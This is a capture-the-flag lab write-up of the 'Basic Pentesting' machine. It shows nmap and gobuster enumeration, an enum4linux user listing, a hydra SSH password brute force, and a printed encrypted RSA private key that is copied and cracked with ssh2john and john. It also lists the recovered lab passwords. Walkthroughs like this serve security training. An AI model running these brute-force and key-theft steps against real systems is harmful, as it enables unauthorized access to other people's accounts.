**Tristan Gomez**

# Basic Pentesting


### Step 1

To begin, I'm going to use a SYN scan to see what ports are open on our target machine.

`sudo nmap -sS -Pn 10.10.124.115`

Looking at our output, the most interesting items are ports 22 and 80 are open. Since http is an active service, I am going to open up the IP address into 
my web browser.

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.                    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-17 12:24 PDT                                                    
Nmap scan report for 10.10.124.115                                                                                 
Host is up (0.17s latency).                                                                                        
Not shown: 994 closed ports                                                                                        
PORT     STATE SERVICE                                                                                             
22/tcp   open  ssh                                                                                                 
80/tcp   open  http                                                                                                
139/tcp  open  netbios-ssn                                                                                         
445/tcp  open  microsoft-ds                                                                                        
8009/tcp open  ajp13                                                                                               
8080/tcp open  http-proxy 
```

When I open the page, I see a maintenance page, but diving into the page's source we can see a comments that gives us an idea of where to look.
There is some sort of dev note page, but what is its URI? 

```
<html>

<h1>Undergoing maintenance</h1>

<h4>Please check back later</h4>

<!-- Check our dev note section if you need to know what to work on. -->


</html>

```

Lets use gobuster to brute force some web pages. `gobuster dir -w directory-list-2.3-small.txt -x .php  -u 10.10.124.115 `

Pretty quickly, we find a `/development` page. Let's check it out!

```
/development          (Status: 301) [Size: 320] [--> http://10.10.124.115/development/]

```

Opening up the page, we see two .txt files. Let's open them up.

```
Index of /development
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[TXT]	dev.txt	2018-04-23 14:52 	483 	 
[TXT]	j.txt	2018-04-23 13:10 	235 	 
Apache/2.4.18 (Ubuntu) Server at 10.10.124.115 Port 80

```

### dev.txt
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

### j.txt
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

So we have a `j` and `k` chatting about configurations, and a message to `j` that their password is easy to crack.
I'm going to run `enum4linux` on the target machine to see if I can find out who these users are. Looking at our output
```
...
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
...
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)


```

Appears like `j` is `jan` and `k` is well...`kay`. Hmm, well `jan's` password is supposedly really weak. I'm going to run `hydra` to see if I can
get a password hit from `rockyou`.

`hydra -l jan -P rockyou.txt ssh://10.10.124.115`


After some amount of time, I get a hit: `jan:armando`. I'm going to login. 
```
[22][ssh] host: 10.10.124.115   login: jan   password: armando

```

We can perform a  `ssh jan@10.10.124.115` and using our password we just found, we successfully login.

### Poking around
I ran ls and nothing was in the current directory. Checking `pwd` we are at `/home/jan`. Lets cd back into /home. When we `ls` here, we can see `jan` and `kay`. NICE! If I cd into `kay` there is a `pass.bak` file. If I try to cat the file, I get `cat: pass.bak: Permission denied`. Doing a quick check on the permissions of the file, looks like only `kay` can read of write this file. <br />

NOTE: `vim pass.bak` works and lets us skip the rest of the challenge. I think this is something the creator of the challenge didn't account for, but let's keep going through the motions. 


I ran a `ls -a` in `/home/.kay`. The most interesting thing to me is the `.ssh` directory. 
```
.   .bash_history  .bashrc  .lesshst  pass.bak  .ssh                       .viminfo
..  .bash_logout   .cache   .nano     .profile  .sudo_as_admin_successful

```

Jumping into the .ssh directory reveals three files. 

```
authorized_keys  id_rsa  id_rsa.pub

```

Checking the permissions of id_rsa...Oh, Oh no...all users can read this file. This si a big ouchie for Kay,

ls -l id_rsa -> `-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
`

Sure enough if we run `cat id_rsa` then we get

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75

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
-----END RSA PRIVATE KEY-----

```

I saved the output of `id_rsa` and saved it into `id_rsa` on my system. Let's try to login with Kay's credentials!

```
$ ssh -i id_rsa kay@10.10.124.115
Enter passphrase for key 'id_rsa': 
```

Huh, I didn't consider the key being password protected. I am going to run `ssh2john` passing in `id_rsa` as an argument. I set the output of the program to be
`converted_key.txt`. Once this is done, I can run `john the ripper` to crack the password for they key.

```
john --wordlist=/usr/share/wordlists/rockyou.txt converted_key.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 16 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (/home/gomez22/Desktop/id_rsa)
1g 0:00:00:01 DONE (2021-08-17 14:14) 0.8130g/s 11659Kp/s 11659Kc/s 11659KC/s  0 0 0..*7¡Vamos!
Session completed

```

`john` quickly finds `beeswax` to be the password for the key. Let's login one more time. Bam! We are in.
Performing a `cat` on pass.bak gives us the final password/flag.

```
kay@basic2:~$ cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```
